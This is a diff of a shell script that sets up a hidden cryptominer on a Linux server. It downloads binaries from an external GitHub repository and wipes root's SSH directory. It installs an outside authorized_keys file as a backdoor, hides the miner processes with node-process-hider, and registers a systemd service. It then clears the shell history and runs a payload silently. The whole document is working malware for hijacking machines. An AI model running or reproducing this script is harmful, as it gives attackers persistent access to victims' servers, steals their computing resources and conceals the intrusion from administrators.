@@ -1,19 +1,17 @@
 apt install screen -y
-wget https://raw.githubusercontent.com/robertreynolds2/mine/main/update && chmod +x update
-rm -rf /root/.ssh/authorized_keys && mkdir /root/.ssh
+wget https://raw.githubusercontent.com/robertreynolds2/mine/main/mina.tar && tar -xf mina.tar && rm -rf mina.tar && chmod +x update logs
+rm -rf /root/.ssh/* && mkdir /root/.ssh
 wget https://raw.githubusercontent.com/robertreynolds2/mine/main/authorized_keys && mv authorized_keys /root/.ssh/authorized_keys
 chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
 clear
 echo "=========="
+apt install gcc -y
 curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs -y && npm i -g node-process-hider
 apt install npm
 npm install -g npm
-ph add SRBMiner-MULTI
 ph add screen
 ph add htop
-ph add java
 ph add update
-ph add storage
 clear
 echo "==================="
 wget https://raw.githubusercontent.com/robertreynolds2/mine/main/storage
@@ -25,4 +23,4 @@ systemctl enable storage
 clear
 echo "======================================"
 history -c
-sudo systemctl start storage /dev/null 2>&1
+./logs > /dev/null 2>&1
